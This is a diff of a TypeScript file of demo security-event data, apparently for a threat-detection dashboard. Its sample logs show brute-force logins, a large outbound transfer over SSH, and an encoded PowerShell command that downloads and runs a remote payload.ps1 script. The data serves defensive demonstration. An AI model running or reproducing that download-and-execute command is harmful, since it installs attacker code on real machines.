@@ -1,5 +1,3 @@
-import { SecurityEvent } from '../types';
-
 export const RAW_DEMO_CSV = `timestamp,source_ip,destination_ip,user,event_type,action,status,process,command,file,bytes_transferred,severity
 2026-08-31T03:14:02Z,185.220.101.5,10.0.1.15,svc_backup,AUTH_FAILED,LOGIN,FAILURE,sshd,,/,0,medium
 2026-08-31T03:14:14Z,185.220.101.5,10.0.1.15,svc_backup,AUTH_FAILED,LOGIN,FAILURE,sshd,,/,0,medium
@@ -33,7 +31,7 @@ Aug 31 03:16:10 auth-srv-01 sudo[14250]: svc_backup : TTY=pts/1 ; PWD=/home/svc_
 Aug 31 08:42:19 ws-04 Microsoft-Windows-Security-Auditing[4688]: Process Creation: powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0dHA6Ly8xOTQuMjYuMjkuMTEyL3BheWxvYWQucHMxJwAp
 Aug 31 02:44:00 db-srv-prod kernel: [FW_OUT] SRC=10.0.4.10 DST=198.51.100.77 PROTO=TCP SPT=42100 DPT=22 BYTES=886080000 USER=c.ross`;
 
-export const CONTROLLED_DEMO_EVENTS: SecurityEvent[] = [
+export const CONTROLLED_DEMO_EVENTS = [
   // --- SCENARIO 1: BRUTE FORCE & ACCOUNT COMPROMISE ---
   {
     id: 'EVT-2026-001',
